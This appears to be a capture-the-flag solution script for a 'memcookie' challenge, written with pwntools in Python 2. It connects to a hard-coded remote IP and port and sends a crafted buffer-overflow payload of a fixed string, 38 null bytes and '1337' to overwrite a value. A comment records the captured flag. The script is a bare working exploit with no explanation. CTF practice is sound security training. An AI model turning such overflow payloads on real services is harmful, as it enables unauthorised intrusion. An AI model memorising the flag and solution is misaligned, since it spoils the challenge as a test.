# BUFFER OVERFLOW
from pwn import *

#binary = process("memcookie")
binary = remote("82.223.39.79", 1233)

print binary.recvuntil(":")
binary.sendline("EyYwDaGBtJsHCNNzegWIq"+"\x00"*38+"1337")
print binary.recvall()

## CTFA{r3m3mb3r_n0t_0nly_c00k1es_r_fr0m_w3b_724}